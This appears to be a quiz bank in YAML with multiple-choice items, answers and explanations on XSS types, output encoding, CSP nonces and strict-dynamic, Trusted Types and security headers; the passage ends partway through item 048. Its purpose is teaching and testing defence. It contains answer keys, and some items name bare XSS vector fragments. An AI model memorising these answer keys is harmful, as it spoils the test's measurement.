topic: "Cross-Site Scripting (XSS), CSP & Security Headers"
domain: security
topic_slug: xss-csp-and-security-headers
version: 1
questions:
- id: xss-csp-and-security-headers-001
  difficulty: beginner
  tags: [xss, fundamentals]
  question: |
    What fundamentally happens in a Cross-Site Scripting (XSS) attack?
  options:
  - "The attacker's JavaScript executes in the victim's browser within the application's origin"
  - "The attacker's SQL runs against the application's backend database to dump or alter stored records"
  - "The attacker reads sensitive files directly from the web server's underlying filesystem"
  - "The attacker floods the server with a high volume of requests to exhaust its CPU and memory"
  answer: 0
  explanation: |
    XSS is the injection of attacker-controlled script that the browser executes inside
    the application's origin, with the victim's identity — giving access to the DOM,
    cookies (unless HttpOnly), storage, and the ability to make credentialed requests.
  ref: "concepts.md#xss-fundamentals"

- id: xss-csp-and-security-headers-002
  difficulty: beginner
  tags: [owasp, injection]
  question: |
    In the OWASP Top 10 2021, XSS is categorized under which entry?
  options:
  - "A01:2021 – Broken Access Control"
  - "A03:2021 – Injection"
  - "A02:2021 – Cryptographic Failures"
  - "A07:2021 – Identification and Authentication Failures"
  answer: 1
  explanation: |
    In the 2021 edition XSS was merged into A03:2021 – Injection, reflecting that XSS is
    injection into an HTML/JavaScript execution context.
  ref: "concepts.md#xss-fundamentals"

- id: xss-csp-and-security-headers-003
  difficulty: intermediate
  tags: [xss, impact]
  question: |
    An interviewer asks what an attacker can do beyond popping an alert() with XSS.
    Which statement is INCORRECT?
  options:
  - "Read CSRF tokens and other DOM content to bypass CSRF protection"
  - "Make authenticated requests as the victim (change email, transfer funds)"
  - "Decrypt the server's TLS private key from the browser"
  - "Steal non-HttpOnly cookies and tokens stored in localStorage"
  answer: 2
  explanation: |
    XSS runs in the browser with the victim's session; it cannot extract the server's
    TLS private key. It can read the DOM/tokens, ride the session, and exfiltrate
    JS-accessible cookies and localStorage.
  ref: "concepts.md#xss-fundamentals"

- id: xss-csp-and-security-headers-004
  difficulty: beginner
  tags: [stored-xss, persistence]
  question: |
    What distinguishes stored (persistent) XSS from other types?
  options:
  - "The payload only executes on the attacker's own machine"
  - "The payload lives entirely in the URL fragment and never reaches the server"
  - "The payload requires the victim to click a specially crafted link"
  - "The payload is saved by the app and served to every user who views the resource"
  answer: 3
  explanation: |
    Stored XSS persists the payload server-side (comment, profile, etc.) and serves it
    to other users, so no per-victim lure is needed — making it the most dangerous and
    wormable variant.
  ref: "concepts.md#stored-xss"

- id: xss-csp-and-security-headers-005
  difficulty: intermediate
  tags: [stored-xss, worm]
  question: |
    Why is stored XSS often considered the most severe XSS variant?
  options:
  - "It affects every user who views the poisoned resource with no lure, and can self-propagate as a worm"
  - "It is the only XSS variant technically capable of reading the victim's session cookies"
  - "It uniquely bypasses HTTPS encryption to intercept the payload while it is in transit"
  - "It can only ever be triggered by privileged administrator accounts, never by ordinary users"
  answer: 0
  explanation: |
    Because the payload is persisted and served to all viewers automatically, stored XSS
    needs no phishing step and can spread as a self-propagating worm (e.g. Samy).
  ref: "concepts.md#stored-xss"

- id: xss-csp-and-security-headers-006
  difficulty: intermediate
  tags: [reflected-xss, delivery]
  question: |
    How is a reflected XSS payload typically delivered to a victim?
  options:
  - "It is stored in the database and shown to all users"
  - "Via a crafted URL/link the victim must be tricked into opening, echoing the payload back in the response"
  - "It runs automatically on every page load without any user interaction"
  - "By modifying the application's server-side source code so the payload ships in the build"
  answer: 1
  explanation: |
    Reflected XSS echoes data from the current request back into the response, so the
    attacker must lure the victim into opening a crafted URL (phishing, malicious ad).
  ref: "concepts.md#reflected-xss"

- id: xss-csp-and-security-headers-007
  difficulty: intermediate
  tags: [reflected-xss, defense]
  question: |
    A search page renders "You searched for: " followed by the raw `q` query parameter
    into the HTML body. What is the correct primary fix?
  options:
  - "Rename the `q` parameter to something unpredictable so attackers cannot guess it"
  - "Move the search box to a POST request so the term is no longer in the query string"
  - "HTML-entity encode `q` on output before it enters the HTML body"
  - "Add a CAPTCHA to the search form to block automated payload submission attempts"
  answer: 2
  explanation: |
    The primary fix is context-aware output encoding — HTML-entity encoding the value
    for the HTML body context so `<script>` becomes inert text. CSP is a good second
    layer, but encoding is the real fix.
  ref: "concepts.md#reflected-xss"

- id: xss-csp-and-security-headers-008
  difficulty: intermediate
  tags: [dom-xss, source-sink]
  question: |
    In DOM-based XSS terminology, what is a "source"?
  options:
  - "An API that renders a string as live DOM or executes it as code"
  - "The server endpoint that persists the payload into the database for later retrieval"
  - "The CSP directive that adds a trusted script origin to the page's allowlist"
  - "Attacker-influenced input read by client JS, e.g. location.hash or document.referrer"
  answer: 3
  explanation: |
    A source is attacker-controllable input the client JavaScript reads (location.hash,
    location.search, document.referrer, window.name, postMessage). A sink is the
    dangerous API the data then flows into.
  ref: "concepts.md#dom-based-xss-source-to-sink"

- id: xss-csp-and-security-headers-009
  difficulty: advanced
  tags: [dom-xss, server-blind]
  question: |
    Why can a DOM-based XSS in `location.hash` evade server-side WAFs and logging?
  options:
  - "Because the URL fragment (after #) is not sent to the server by the browser"
  - "Because commercial WAFs are only able to inspect POST request bodies, never GET URLs"
  - "Because the fragment portion of a URL is always encrypted separately while in transit"
  - "Because DOM-based XSS mandates TLS, and that encryption hides the payload from the WAF"
  answer: 0
  explanation: |
    Browsers do not transmit the fragment (everything after `#`) to the server, so a
    payload placed there never appears in server logs or WAF inspection — the flaw and
    the fix are entirely client-side.
  ref: "concepts.md#dom-based-xss-source-to-sink"

- id: xss-csp-and-security-headers-010
  difficulty: intermediate
  tags: [dom-xss, fix]
  question: |
    Client code does: `el.innerHTML = decodeURIComponent(location.hash.slice(1))`.
    Which is the best fix?
  options:
  - "URL-encode the hash value a second time before it is assigned to innerHTML"
  - "Use el.textContent instead of el.innerHTML (or sanitize with DOMPurify if HTML is required)"
  - "Add server-side HTML entity encoding of the response body before it is sent"
  - "Switch the page from HTTP to HTTPS so the fragment is delivered over an encrypted channel"
  answer: 1
  explanation: |
    The source→sink flow is fixed on the client: use textContent (treats input as text)
    or sanitize with a vetted library if HTML is genuinely needed. Server-side encoding
    cannot help because the fragment never reaches the server.
  ref: "concepts.md#dom-based-xss-source-to-sink"

- id: xss-csp-and-security-headers-011
  difficulty: intermediate
  tags: [output-encoding, context]
  question: |
    Why is "just HTML-escape everything" insufficient to prevent XSS?
  options:
  - "HTML escaping is far too slow to run on every value in a high-traffic production system"
  - "HTML escaping corrupts multi-byte Unicode characters and non-Latin scripts on output"
  - "The correct encoding depends on the context (HTML body, attribute, JS, URL, CSS); wrong-context encoding is still exploitable"
  - "Modern browsers silently ignore HTML entities entirely, so escaping has no rendered effect"
  answer: 2
  explanation: |
    A value safe in the HTML body may be dangerous inside a <script> block, a URL, or a
    CSS value. Encoding must be context-aware; HTML-encoding a value placed in a script
    context does not stop </script> breakouts.
  ref: "concepts.md#execution-contexts-and-output-encoding"

- id: xss-csp-and-security-headers-012
  difficulty: intermediate
  tags: [output-encoding, url-context]
  question: |
    Untrusted data is placed into `<a href="/go?next=DATA">`. Which encoding is correct
    for the DATA value?
  options:
  - "CSS escaping, backslash-escaping any characters that are special within a style value"
  - "Base64 encoding of the value so it becomes an opaque, non-breaking ASCII token"
  - "No encoding is needed inside an href attribute because the browser sanitizes URLs itself"
  - "URL (percent) encoding of the value"
  answer: 3
  explanation: |
    Data placed into a URL/query context must be percent-encoded so it stays a single
    inert parameter value and cannot break out of the URL or attribute.
  ref: "concepts.md#execution-contexts-and-output-encoding"

- id: xss-csp-and-security-headers-013
  difficulty: advanced
  tags: [output-encoding, script-context]
  question: |
    Per the OWASP XSS Prevention Cheat Sheet, what is the guidance about placing
    untrusted data directly inside a `<script>` block or an inline event handler?
  options:
  - "Avoid it entirely; if needed, pass data via data-* attributes or a JSON island and read it with safe DOM APIs"
  - "It is completely safe as long as you HTML-entity encode the value before it is emitted"
  - "It is safe provided the surrounding script is loaded over an HTTPS connection with valid TLS"
  - "It is safe as long as you also set the Secure and HttpOnly flags on the session cookie"
  answer: 0
  explanation: |
    Injecting into a scripting context is inherently dangerous even with HTML encoding.
    OWASP's rule is not to put untrusted data there; instead pass it through data
    attributes or a JSON block and read it safely.
  ref: "concepts.md#execution-contexts-and-output-encoding"

- id: xss-csp-and-security-headers-014
  difficulty: beginner
  tags: [framework, auto-escaping]
  question: |
    Why is "use your framework's default rendering" the #1 practical XSS defense?
  options:
  - "Frameworks disable inline JavaScript entirely, so no injected script can ever execute"
  - "Modern frameworks auto-escape interpolated values for the HTML context by default"
  - "Frameworks transparently encrypt all rendered output so injected markup stays unreadable"
  - "Frameworks block all inbound HTTP requests originating from any other cross-site origin"
  answer: 1
  explanation: |
    React, Angular, Vue, and most server templates auto-escape interpolated values for
    the HTML body context, so ordinary rendering is safe unless you use an escape hatch.
  ref: "concepts.md#framework-auto-escaping"

- id: xss-csp-and-security-headers-015
  difficulty: intermediate
  tags: [framework, react, escape-hatch]
  question: |
    Which React feature is the classic way to reintroduce XSS by bypassing
    auto-escaping?
  options:
  - "useState"
  - "useEffect"
  - "dangerouslySetInnerHTML"
  - "React.Fragment"
  answer: 2
  explanation: |
    dangerouslySetInnerHTML sets raw HTML without escaping (the name is a warning). Feed
    it untrusted data and you have XSS. Angular's [innerHTML]/bypassSecurityTrust* and
    Vue's v-html are the equivalents.
  ref: "concepts.md#framework-auto-escaping"

- id: xss-csp-and-security-headers-016
  difficulty: advanced
  tags: [framework, react, gotcha]
  question: |
    "React auto-escapes, so my app is XSS-proof." Which of these is a REAL way XSS can
    still occur in a React app?
  options:
  - "Rendering an attacker-supplied plain string as an ordinary text child inside a <div>"
  - "Using useMemo to cache a computed value derived from attacker-controlled component props"
  - "Passing attacker-influenced props down through several layers of child components"
  - "Setting an attacker-controlled `javascript:` URL as an <a href> or <img src>"
  answer: 3
  explanation: |
    Auto-escaping covers text children, not URL attributes. An attacker-controlled
    href/src of `javascript:...`, dangerouslySetInnerHTML, or unsafe ref DOM writes all
    reopen XSS even in React.
  ref: "concepts.md#framework-auto-escaping"

- id: xss-csp-and-security-headers-017
  difficulty: intermediate
  tags: [input-validation, defense-in-depth]
  question: |
    What is the correct role of input validation in preventing XSS?
  options:
  - "It is defense in depth; output encoding/sanitization is the primary fix"
  - "It is the single primary and fully sufficient fix for XSS on its own, with no other control needed"
  - "It completely replaces the need for any context-aware output encoding at the sink"
  - "It is only useful for stopping SQL injection at the database layer, never for XSS"
  answer: 0
  explanation: |
    Input validation (allowlisting structure) is valuable defense in depth, but many
    fields legitimately contain special characters and the same value renders into many
    contexts. Output encoding is the correctness fix.
  ref: "concepts.md#input-validation-as-defense-in-depth"

- id: xss-csp-and-security-headers-018
  difficulty: intermediate
  tags: [input-validation, blocklist]
  question: |
    Why are blocklist input filters (e.g. stripping the string "<script>") a weak XSS
    defense?
  options:
  - "They are far too slow to run against the request body on every single inbound request"
  - "They are trivially bypassed via alternate vectors like <img onerror=>, <svg onload=>, mixed case, or entities"
  - "They inevitably break legitimate HTML forms whose fields contain angle brackets or quotes"
  - "Browsers silently ignore all input that has been passed through a server-side filter"
  answer: 1
  explanation: |
    Blocklists miss the huge space of alternatives: <img src=x onerror=>, <svg onload=>,
    <iframe srcdoc=>, case/whitespace tricks, entities, mutation XSS. Prefer allowlist
    validation plus output encoding/sanitization.
  ref: "concepts.md#input-validation-as-defense-in-depth"

- id: xss-csp-and-security-headers-019
  difficulty: advanced
  tags: [sanitization, rich-text]
  question: |
    For a field that must accept user-supplied HTML (a WYSIWYG bio), what is the correct
    approach?
  options:
  - "HTML-entity encode the entire bio on output so every tag and quote renders as inert visible text"
  - "Write a custom regular expression that strips <script> tags and on* handlers before storing"
  - "Sanitize with a robust, maintained HTML sanitizer (e.g. DOMPurify) that strips dangerous elements/attributes"
  - "Store and render it raw exactly as submitted, since the user only harms their own profile"
  answer: 2
  explanation: |
    Encoding would break the intended formatting, and regex filters miss mutation-XSS
    edge cases. Use a vetted, maintained sanitizer that parses and strips dangerous
    markup. Never hand-roll one with regexes.
  ref: "concepts.md#input-validation-as-defense-in-depth"

- id: xss-csp-and-security-headers-020
  difficulty: beginner
  tags: [sinks, dom]
  question: |
    Which of the following is a dangerous DOM "sink" that can lead to XSS if fed
    untrusted data?
  options:
  - "element.textContent"
  - "JSON.parse"
  - "Array.prototype.map"
  - "element.innerHTML"
  answer: 3
  explanation: |
    innerHTML parses its string as markup and will run event-handler attributes on
    injected elements. textContent is safe (treated as text). JSON.parse and map do not
    touch the DOM.
  ref: "concepts.md#dangerous-sinks"

- id: xss-csp-and-security-headers-021
  difficulty: intermediate
  tags: [sinks, eval]
  question: |
    Which replacement is the safe alternative when you need to schedule code with
    setTimeout?
  options:
  - "Pass a function reference: setTimeout(doThing, 100)"
  - "Pass a string of code: setTimeout('doThing()', 100)"
  - "Use eval(doThing) instead"
  - "Use document.write to schedule it"
  answer: 0
  explanation: |
    setTimeout/setInterval with a STRING argument behaves like eval and is a code
    sink. Pass a function reference instead so no string is compiled as code.
  ref: "concepts.md#dangerous-sinks"

- id: xss-csp-and-security-headers-022
  difficulty: intermediate
  tags: [sinks, safe-api]
  question: |
    Which pairing correctly matches a dangerous sink with its safe replacement?
  options:
  - "innerHTML -> outerHTML"
  - "innerHTML -> textContent"
  - "document.write -> eval"
  - "eval(jsonString) -> Function(jsonString)"
  answer: 1
  explanation: |
    Replace innerHTML with textContent (or createElement+append) to treat input as text.
    outerHTML and document.write are also markup sinks; eval and Function both execute
    code — none are safe replacements.
  ref: "concepts.md#dangerous-sinks"

- id: xss-csp-and-security-headers-023
  difficulty: intermediate
  tags: [trusted-types, dom-xss]
  question: |
    What does Trusted Types (enabled via CSP) primarily protect against?
  options:
  - "Reflected XSS by escaping user input echoed back into server-rendered response bodies"
  - "SQL injection by parameterizing queries before they reach the backend database"
  - "DOM-based XSS by forbidding plain strings at dangerous DOM sinks"
  - "Cross-site request forgery by validating an anti-CSRF token on every state-changing request"
  answer: 2
  explanation: |
    Trusted Types locks down DOM injection sinks (innerHTML, script.src, eval): they
    only accept typed objects produced by a registered policy, eliminating string-to-sink
    DOM XSS.
  ref: "concepts.md#trusted-types"

- id: xss-csp-and-security-headers-024
  difficulty: advanced
  tags: [trusted-types, header]
  question: |
    Which CSP directive turns on Trusted Types enforcement at script sinks?
  options:
  - "script-src 'self'"
  - "upgrade-insecure-requests"
  - "sandbox allow-scripts"
  - "require-trusted-types-for 'script'"
  answer: 3
  explanation: |
    `require-trusted-types-for 'script'` enables enforcement so DOM sinks reject raw
    strings; `trusted-types <policy>` names the allowed policy factories that can mint
    TrustedHTML/TrustedScript values.
  ref: "concepts.md#trusted-types"

- id: xss-csp-and-security-headers-025
  difficulty: advanced
  tags: [trusted-types, layers]
  question: |
    How do Trusted Types and a nonce-based CSP complement each other?
  options:
  - "Trusted Types addresses DOM/client-side sinks, while nonce CSP blocks injected server-reflected scripts"
  - "They are fully redundant; enabling either one automatically satisfies the other's guarantees at every sink"
  - "Trusted Types replaces the need for HTTPS transport while nonce CSP replaces the session cookie mechanism"
  - "Both only take effect in report-only mode and can never actually block execution in enforcing mode"
  answer: 0
  explanation: |
    They cover the two halves of XSS: nonce/hash CSP stops injected <script> from
    executing (reflected/stored), and Trusted Types stops client-side string→sink DOM
    XSS. Together they close both paths.
  ref: "concepts.md#trusted-types"

- id: xss-csp-and-security-headers-026
  difficulty: beginner
  tags: [csp, fundamentals]
  question: |
    What is the primary purpose of Content Security Policy (CSP)?
  options:
  - "To encrypt cookie values at rest in the browser's cookie store so scripts cannot read them"
  - "To tell the browser which sources of scripts/styles/etc. may load or execute, mitigating injected-script execution"
  - "To replace TLS as the transport-layer confidentiality mechanism for the connection"
  - "To validate and reject malformed form input on the server before it reaches the handler"
  answer: 1
  explanation: |
    CSP is a defense-in-depth response header restricting which content sources may load
    and execute. Even if a <script> is injected, a good CSP can stop it from running.
  ref: "concepts.md#content-security-policy-fundamentals"

- id: xss-csp-and-security-headers-027
  difficulty: intermediate
  tags: [csp, default-src]
  question: |
    Which CSP directive is NOT covered by `default-src` and must be set explicitly?
  options:
  - "script-src"
  - "img-src"
  - "frame-ancestors"
  - "font-src"
  answer: 2
  explanation: |
    default-src is the fallback for fetch directives like script-src, img-src, font-src.
    It does NOT cover frame-ancestors, base-uri, form-action, or report-uri — those must
    be declared separately.
  ref: "concepts.md#content-security-policy-fundamentals"

- id: xss-csp-and-security-headers-028
  difficulty: intermediate
  tags: [csp, report-only]
  question: |
    What is the difference between `Content-Security-Policy` and
    `Content-Security-Policy-Report-Only`?
  options:
  - "Report-Only fully enforces and blocks the policy but suppresses all violation reports"
  - "They are identical aliases that produce byte-for-byte the same browser behavior"
  - "Report-Only is only honored on plain HTTP responses and is silently ignored over HTTPS"
  - "Report-Only logs violations without blocking, useful for safely rolling out a policy"
  answer: 3
  explanation: |
    Report-Only observes and reports violations without blocking anything, letting you
    validate a strict policy against real traffic before switching to the enforcing
    header.
  ref: "concepts.md#content-security-policy-fundamentals"

- id: xss-csp-and-security-headers-029
  difficulty: intermediate
  tags: [csp, misconception]
  question: |
    Which statement about CSP is the most accurate?
  options:
  - "CSP mitigates the execution of injected scripts but does not fix the underlying injection"
  - "CSP prevents malicious data from ever being injected into the page markup in the first place"
  - "CSP fully replaces context-aware output encoding, making it unnecessary at the sink"
  - "CSP guarantees that no data can ever be exfiltrated from the page to an external host"
  answer: 0
  explanation: |
    CSP is a second line of defense: it limits what executes, not whether injection
    happens. You still must fix the injection with output encoding, and CSP can be
    bypassed if misconfigured.
  ref: "concepts.md#content-security-policy-fundamentals"

- id: xss-csp-and-security-headers-030
  difficulty: intermediate
  tags: [csp, unsafe-inline]
  question: |
    Why does `script-src 'unsafe-inline'` largely defeat CSP's XSS protection?
  options:
  - "It disables HTTPS enforcement for script requests, letting them load over plain HTTP"
  - "It allows all inline scripts and event handlers to run, including attacker-injected ones"
  - "It blocks the site's own legitimate inline and external scripts from executing at all"
  - "It forces every script on the page to be fetched from an external CDN origin"
  answer: 1
  explanation: |
    'unsafe-inline' permits every inline <script> and on* handler, so an injected inline
    script is allowed to execute — negating the main benefit of CSP. Use nonces or
    hashes instead.
  ref: "concepts.md#csp-script-sources-nonces-hashes-unsafe-inline"

- id: xss-csp-and-security-headers-031
  difficulty: intermediate
  tags: [csp, nonce]
  question: |
    For a CSP nonce to be effective, it must be:
  options:
  - "A single static value hard-coded and shared across all pages so responses stay cacheable"
  - "Set to the exact same value as the user's current session ID for each request"
  - "Cryptographically random and unique per response, on both the header and each legitimate tag"
  - "A short predictable counter that increments by one on every successive request"
  answer: 2
  explanation: |
    A nonce works only if it is unpredictable and fresh per response; the server puts the
    same value in the header and on each legit <script nonce>. Injected scripts can't
    guess it. A static/reused nonce is worthless.
  ref: "concepts.md#csp-script-sources-nonces-hashes-unsafe-inline"

- id: xss-csp-and-security-headers-032
  difficulty: advanced
  tags: [csp, nonce-vs-hash]
  question: |
    When is a CSP hash (`'sha256-...'`) preferable to a nonce for allowing an inline
    script?
  options:
  - "When the inline script body is regenerated with different content on every single request"
  - "When you want every inline script on the page allowed at once without listing any"
  - "Hashes are always strictly weaker than nonces and are never used in real policies"
  - "When the inline script content is static and served from a cache/CDN where a per-request nonce cannot be injected"
  answer: 3
  explanation: |
    Hashes pin the exact bytes of a static inline script, so no per-request server work
    is needed — ideal for cached/edge-served static content. Nonces suit dynamic
    server-rendered pages that can emit a fresh value each response.
  ref: "concepts.md#csp-script-sources-nonces-hashes-unsafe-inline"

- id: xss-csp-and-security-headers-033
  difficulty: advanced
  tags: [csp, backward-compat]
  question: |
    Given `script-src 'nonce-abc123' 'unsafe-inline'`, how do modern (CSP2+) browsers
    treat `'unsafe-inline'`?
  options:
  - "They ignore 'unsafe-inline' because a nonce/hash is present, enforcing the strong nonce policy"
  - "They apply 'unsafe-inline' and ignore the nonce, so every inline script runs unconditionally"
  - "They reject the entire policy as malformed and fall back to allowing all script sources"
  - "They allow only externally hosted scripts from CDNs and block the nonced inline scripts"
  answer: 0
  explanation: |
    When a nonce or hash is present, CSP2+ browsers ignore 'unsafe-inline'. This lets it
    serve as a fallback for old browsers while modern ones enforce the strict nonce
    policy.
  ref: "concepts.md#csp-script-sources-nonces-hashes-unsafe-inline"

- id: xss-csp-and-security-headers-034
  difficulty: advanced
  tags: [csp, allowlist, strict-dynamic]
  question: |
    Why did Google's "CSP Is Dead, Long Live CSP" research conclude that host-allowlist
    CSPs are largely ineffective?
  options:
  - "Allowlists have a hard length cap that is too short to enumerate the real CDNs a site uses"
  - "Trusted allowlisted hosts often expose JSONP endpoints and script gadgets that let attackers run code from an allowed origin"
  - "Browsers silently ignore host-based allowlist source expressions in script-src entirely"
  - "Host allowlist policies are only honored on connections negotiated over the HTTP/2 protocol"
  answer: 1
  explanation: |
    The study found ~94% of allowlist policies were bypassable because allowlisted CDNs
    host JSONP callbacks, AngularJS, and gadgets that execute attacker code from an
    allowed origin. Nonce + strict-dynamic is the recommended replacement.
  ref: "concepts.md#strict-dynamic-and-why-allowlist-csp-fails"

- id: xss-csp-and-security-headers-035
  difficulty: advanced
  tags: [csp, strict-dynamic]
  question: |
    What does `'strict-dynamic'` do in a CSP script-src?
  options:
  - "It blocks every dynamically created script element from executing, even ones added by trusted code"
  - "It forces all external scripts to be inlined into the document before they are allowed to run"
  - "It trusts scripts loaded by an already-trusted (nonced) script and makes browsers ignore host allowlists and 'unsafe-inline'"
  - "It disables the nonce mechanism and falls back to a plain host-based allowlist instead"
  answer: 2
  explanation: |
    strict-dynamic propagates trust: a nonced script can load further scripts without
    enumerating CDN hosts, and supporting browsers ignore host allowlists/unsafe-inline.
    Injected <script src> still lacks the nonce and is blocked.
  ref: "concepts.md#strict-dynamic-and-why-allowlist-csp-fails"

- id: xss-csp-and-security-headers-036
  difficulty: advanced
  tags: [csp, strict-dynamic, fallback]
  question: |
    In `script-src 'nonce-r4nd0m' 'strict-dynamic' https: 'unsafe-inline'`, what is the
    role of the trailing `https:` and `'unsafe-inline'`?
  options:
  - "They form the primary enforced policy that modern strict-dynamic browsers actually apply"
  - "They let any HTTPS origin load and inject scripts even in browsers that support strict-dynamic"
  - "They switch on Trusted Types enforcement at the page's dangerous script sinks"
  - "They are fallbacks for older browsers that don't understand strict-dynamic; supporting browsers ignore them"
  answer: 3
  explanation: |
    Browsers supporting strict-dynamic ignore host allowlists and unsafe-inline, so
    those tokens only serve as graceful fallbacks for older browsers — a backward-compat
    layering technique.
  ref: "concepts.md#strict-dynamic-and-why-allowlist-csp-fails"

- id: xss-csp-and-security-headers-037
  difficulty: intermediate
  tags: [csp, reporting]
  question: |
    Which CSP mechanism causes the browser to POST a JSON report when a policy is
    violated?
  options:
  - "report-uri (or the newer report-to / Reporting-Endpoints)"
  - "sandbox, which applies iframe-style script and form restrictions"
  - "upgrade-insecure-requests, rewriting http:// subresources to https://"
  - "require-sri-for, which mandates Subresource Integrity hashes"
  answer: 0
  explanation: |
    report-uri (legacy) and report-to (Reporting API) direct the browser to send
    violation reports, useful for monitoring attacks and safely rolling out policies. For
    compatibility both are often sent.
  ref: "concepts.md#csp-reporting"

- id: xss-csp-and-security-headers-038
  difficulty: intermediate
  tags: [csp, rollout]
  question: |
    What is the recommended way to roll out a strict CSP without breaking a live site?
  options:
  - "Enable the strict enforcing policy immediately and fix breakage as users report it"
  - "Deploy it first in Content-Security-Policy-Report-Only with a report endpoint, triage reports, then switch to enforcing"
  - "Apply CSP only to the login and checkout pages, leaving the rest of the site unprotected by any policy"
  - "Ship 'unsafe-inline' 'unsafe-eval' permanently in the enforcing header so no legitimate inline script ever breaks"
  answer: 1
  explanation: |
    Ship the target policy in Report-Only mode, watch the violation stream for legitimate
    resources you missed, adjust, then flip to the enforcing header once the reports are
    clean.
  ref: "concepts.md#csp-reporting"

- id: xss-csp-and-security-headers-039
  difficulty: beginner
  tags: [hsts, transport]
  question: |
    What attack does the `Strict-Transport-Security` (HSTS) header primarily defend
    against?
  options:
  - "SQL injection against the backend query layer"
  - "DOM-based cross-site scripting via client-side sinks"
  - "SSL-stripping / protocol-downgrade man-in-the-middle attacks"
  - "Brute-force guessing of user account passwords"
  answer: 2
  explanation: |
    HSTS forces the browser to use HTTPS for the host, defeating sslstrip-style attacks
    that downgrade an initial cleartext request to intercept traffic.
  ref: "concepts.md#hsts-and-preload"

- id: xss-csp-and-security-headers-040
  difficulty: intermediate
  tags: [hsts, preload]
  question: |
    What gap does adding a domain to the HSTS `preload` list close?
  options:
  - "It encrypts the site's cookies at rest inside the browser's cookie store"
  - "It prevents cross-site scripting on the login and authentication pages"
  - "It disables HTTP/2 so requests fall back to plaintext HTTP/1.1 framing"
  - "It forces HTTPS even on the very first-ever request, before any HSTS header is seen"
  answer: 3
  explanation: |
    Without preloading, the first request can still go over HTTP (trust-on-first-use).
    The preload list is baked into browsers so even the first connection is forced to
    HTTPS. It requires max-age >= 1 year, includeSubDomains, and preload.
  ref: "concepts.md#hsts-and-preload"

- id: xss-csp-and-security-headers-041
  difficulty: intermediate
  tags: [hsts, gotcha]
  question: |
    Why is `Strict-Transport-Security: max-age=63072000; includeSubDomains; preload` a
    potential foot-gun?
  options:
  - "If any subdomain cannot serve HTTPS, it becomes unreachable in browsers, and preload is hard to undo"
  - "It measurably slows the site because every request pays a fresh TLS handshake cost"
  - "It silently disables all cookies on subdomains that lack a valid TLS certificate"
  - "Browsers cap and ignore any max-age value that exceeds exactly one calendar year"
  answer: 0
  explanation: |
    includeSubDomains + preload forces HTTPS on every subdomain; a legacy HTTP-only
    subdomain breaks. Preloading also propagates slowly and is hard to reverse, so roll
    out with a short max-age first.
  ref: "concepts.md#hsts-and-preload"

- id: xss-csp-and-security-headers-042
  difficulty: beginner
  tags: [nosniff, mime]
  question: |
    What does `X-Content-Type-Options: nosniff` do?
  options:
  - "It gzip-compresses response bodies to reduce their transfer size over the wire"
  - "It disables MIME sniffing so the browser honors the declared Content-Type"
  - "It blocks all cross-origin requests that lack a matching CORS Access-Control header"
  - "It forces every cookie the response sets to carry the Secure attribute automatically"
  answer: 1
  explanation: |
    nosniff stops the browser from guessing content types, preventing a file served as
    e.g. text/plain from being reinterpreted and executed as HTML or JavaScript.
  ref: "concepts.md#x-content-type-options-nosniff"

- id: xss-csp-and-security-headers-043
  difficulty: intermediate
  tags: [nosniff, uploads]
  question: |
    For `nosniff` to actually protect against a malicious upload being executed as HTML,
    what else is required?
  options:
  - "The upload must be smaller than the 1 MB browser sniffing threshold"
  - "The file must be Base64-encoded before it is written to disk on the server"
  - "The server must send an accurate, restrictive Content-Type for the file"
  - "The upload must be delivered over an HTTP/1.1 connection rather than HTTP/2"
  answer: 2
  explanation: |
    nosniff only makes the browser trust the declared type, so you must send a correct
    restrictive Content-Type (and ideally serve uploads from a separate cookieless
    origin) to stop coercion into executable content.
  ref: "concepts.md#x-content-type-options-nosniff"

- id: xss-csp-and-security-headers-044
  difficulty: intermediate
  tags: [referrer-policy, privacy]
  question: |
    Which `Referrer-Policy` value is the modern browser default and a good baseline?
  options:
  - "unsafe-url"
  - "no-referrer-when-downgrade"
  - "origin-when-cross-origin"
  - "strict-origin-when-cross-origin"
  answer: 3
  explanation: |
    strict-origin-when-cross-origin sends the full URL same-origin, only the origin
    cross-origin, and nothing on HTTPS->HTTP downgrade. It is the current default and a
    sensible baseline.
  ref: "concepts.md#referrer-policy"

- id: xss-csp-and-security-headers-045
  difficulty: intermediate
  tags: [referrer-policy, leakage]
  question: |
    What is the best practice regarding secrets and the Referer header?
  options:
  - "Never put secrets (tokens, reset codes) in URLs at all; Referrer-Policy only reduces blast radius"
  - "Encrypt the Referer header value with the current session key before the browser sends it"
  - "Set Referrer-Policy: unsafe-url so full URLs are always sent, making server-side debugging easier"
  - "Rely on HTTPS transport encryption alone to hide the Referer header from every downstream party"
  answer: 0
  explanation: |
    Referer leakage, browser history, logs, and shared links all expose URL contents.
    Referrer-Policy mitigates cross-origin leakage but the real fix is keeping secrets out
    of URLs entirely.
  ref: "concepts.md#referrer-policy"

- id: xss-csp-and-security-headers-046
  difficulty: intermediate
  tags: [clickjacking, frame-ancestors]
  question: |
    Which is the modern replacement for `X-Frame-Options` to control clickjacking, and
    why is it better?
  options:
  - "Permissions-Policy, because it disables the camera and other framing-related powerful features"
  - "CSP frame-ancestors, because it supports multiple allowed origins and is standardized in CSP"
  - "Referrer-Policy, because it hides the framed page's URL from the embedding parent document"
  - "HSTS, because it forces HTTPS and thereby stops any attacker page from framing the site"
  answer: 1
  explanation: |
    CSP frame-ancestors supersedes X-Frame-Options, supports multiple allowed origins
    (unlike XFO's single value / deprecated ALLOW-FROM), and is part of CSP. Keep XFO
    only as a legacy fallback.
  ref: "concepts.md#clickjacking-x-frame-options-vs-frame-ancestors"

- id: xss-csp-and-security-headers-047
  difficulty: intermediate
  tags: [clickjacking, deny]
  question: |
    A page must never be framed by anyone. Which combination best expresses this?
  options:
  - "X-Frame-Options: ALLOW-FROM * as the sole framing-control header on the response"
  - "default-src 'none' only, relying on the fallback to also cover the framing case"
  - "CSP frame-ancestors 'none' (with X-Frame-Options: DENY as a legacy fallback)"
  - "Permissions-Policy: frame=() to remove the framing capability from the document"
  answer: 2
  explanation: |
    frame-ancestors 'none' denies all framing in modern browsers; X-Frame-Options: DENY
    is the legacy fallback. Note frame-ancestors is NOT governed by default-src, and
    ALLOW-FROM is deprecated.
  ref: "concepts.md#clickjacking-x-frame-options-vs-frame-ancestors"

- id: xss-csp-and-security-headers-048
  difficulty: intermediate
  tags: [permissions-policy, hardening]
  question: |
    What does `Permissions-Policy: geolocation=(), camera=()` accomplish?
  options:
  - "It grants the page and every embedded iframe unrestricted access to geolocation and camera"
  - "It encrypts geolocation coordinates before any script on the page is allowed to read them"
  - "It blocks cross-site cookies from being attached to geolocation and camera API requests"
